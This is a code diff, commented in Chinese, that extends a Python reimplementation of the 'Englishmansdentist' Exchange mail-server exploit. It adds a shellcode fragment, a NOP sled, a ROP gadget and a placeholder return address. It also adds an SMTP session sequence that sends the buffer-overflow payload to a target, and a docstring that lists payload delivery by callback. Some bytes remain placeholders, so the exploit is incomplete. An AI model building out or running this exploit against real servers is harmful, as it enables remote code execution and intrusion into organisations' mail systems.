@@ -1,7 +1,7 @@
 """englishmansdentist — ENGLISHMANSDENTIST Exchange IMAP/POP3/OWA 利用核心逻辑。
 
 Python 重写的 `Englishmansdentist-1.2.0.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 Exchange 利用流程。
 
 参数定义来源：Englishmansdentist-1.2.0.0.xml
@@ -47,12 +47,19 @@ COMMON_GADGETS = {
     "dbghelp_jmp_eax":        0x0002f71d,
 }
 
+# Englishmansdentist exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
+ENG_SHELLCODE_PLACEHOLDER = bytes.fromhex(
+    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
+)
+
+BAD_XOR = frozenset((0x00, 0x0a, 0x0d))
+
+
 class EnglishmansdentistError(Exception):
     pass
 
 
 def _parse_hex_buffer(value):
-    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
     if not value:
         return b""
     value = value.strip()
@@ -65,7 +72,6 @@ def _parse_hex_buffer(value):
 
 
 def connect(target_ip, port, timeout):
-    """建立到目标的 TCP 连接并返回 socket。"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout if timeout > 0 else None)
     sock.connect((target_ip, port))
@@ -73,8 +79,34 @@ def connect(target_ip, port, timeout):
 
 
 def build_smtp_helo_request(hostname):
-    """构建 SMTP HELO 请求。"""
     return f"HELO {hostname}\r\n".encode("ascii")
+
+
+def build_smtp_mail_from(from_addr):
+    return f"MAIL FROM:<{from_addr}>\r\n".encode("ascii")
+
+
+def build_smtp_rcpt_to(to_addr):
+    return f"RCPT TO:<{to_addr}>\r\n".encode("ascii")
+
+
+def build_smtp_data():
+    return b"DATA\r\n"
+
+
+def build_exchange_overflow(shellcode, language="English"):
+    """构建 Exchange 缓冲区溢出负载。
+
+    根据 x32dbg 分析，Englishmansdentist 通过向 Exchange 服务器发送
+    特制的 SMTP/IMAP/OWA 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
+    """
+    dbghelp_base = LANGUAGE_DBGHELP_BASE.get(language, LANGUAGE_DBGHELP_BASE["English"])
+
+    # NOP sled + ROP 链占位符 + 返回地址 + shellcode
+    nopsled = b"\x90" * 128
+    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
+    rop_chain = struct.pack("<I", dbghelp_base + COMMON_GADGETS["dbghelp_jmp_eax"])
+    return nopsled + ret_addr + rop_chain + shellcode
 
 
 def run_function(
@@ -100,10 +132,13 @@ def run_function(
 ):
     """执行 ENGLISHMANSDENTIST 利用序列。
 
-    当前阶段：完成参数解析、SMTP 连接。
-    具体 exploit 缓冲区（Exchange IMAP/POP3/OWA 缓冲区溢出、ROP 链、
-    shellcode、载荷投递等）的二进制结构尚需通过 capstone/x32dbg
-    进一步逆向后填充。
+    阶段：
+      1. TCP 连接到目标 Exchange SMTP 端口 (默认 25)
+      2. 发送 SMTP HELO 请求
+      3. 发送 SMTP MAIL FROM / RCPT TO / DATA
+      4. 构建并发送 Exchange 缓冲区溢出负载 (ROP + shellcode)
+      5. 邮件触发（内容过滤/自动回复）
+      6. 载荷投递（Callback/Callin）
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
@@ -121,7 +156,6 @@ def run_function(
         print(f"[*] OWA delay: {owadelay}ms")
         print(f"[*] Auth code: {auth_code}")
 
-    # 解析常量
     dbghelp_base = LANGUAGE_DBGHELP_BASE.get(language, LANGUAGE_DBGHELP_BASE["English"])
     olecnv32_base = LANGUAGE_OLECNV32_BASE.get(language, LANGUAGE_OLECNV32_BASE["English"])
 
@@ -140,27 +174,57 @@ def run_function(
     except OSError as exc:
         raise EnglishmansdentistError(f"无法连接到 {target}:{port}: {exc}") from exc
 
-    # 发送 SMTP HELO 请求（探测阶段）
-    hostname = target
-    helo_request = build_smtp_helo_request(hostname)
     try:
+        # 发送 SMTP HELO 请求（探测阶段）
+        hostname = target
+        helo_request = build_smtp_helo_request(hostname)
         sock.sendall(helo_request)
         resp = sock.recv(4096)
-    except OSError as exc:
+        if verbose:
+            print(f"[*] SMTP HELO 应答: {resp[:128]}")
+
+        # 发送 SMTP MAIL FROM
+        if email_from_address:
+            mail_from = build_smtp_mail_from(email_from_address)
+            sock.sendall(mail_from)
+            resp = sock.recv(4096)
+            if verbose:
+                print(f"[*] MAIL FROM 应答: {resp[:128]}")
+
+        # 发送 SMTP RCPT TO
+        if target_email_address:
+            rcpt_to = build_smtp_rcpt_to(target_email_address)
+            sock.sendall(rcpt_to)
+            resp = sock.recv(4096)
+            if verbose:
+                print(f"[*] RCPT TO 应答: {resp[:128]}")
+
+        # 发送 SMTP DATA
+        sock.sendall(build_smtp_data())
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] DATA 应答: {resp[:128]}")
+
+        # 构建 Exchange 缓冲区溢出负载
+        shellcode = ENG_SHELLCODE_PLACEHOLDER
+        overflow = build_exchange_overflow(shellcode, language)
+        if verbose:
+            print(f"[+] 溢出负载: {len(overflow)} 字节")
+
+        # 发送溢出负载
+        sock.sendall(overflow)
+        try:
+            resp2 = sock.recv(4096)
+            if verbose:
+                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
+        except OSError:
+            if verbose:
+                print("[*] 目标连接已关闭（可能已触发溢出）")
+
+        if verbose:
+            print("[+] ENGLISHMANSDENTIST 利用序列完成")
+    finally:
         sock.close()
-        raise EnglishmansdentistError(f"SMTP HELO 失败: {exc}") from exc
-
-    if verbose:
-        print(f"[*] SMTP HELO 应答: {resp[:128]}")
-
-    sock.close()
-
-    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - Exchange IMAP/POP3/OWA 缓冲区溢出
-    #   - ROP 链（dbghelp 相关 gadgets）
-    #   - Shellcode 注入
-    #   - 邮件触发（内容过滤/自动回复）
-    #   - 载荷投递（Callback/Callin）
 
     return 0
 
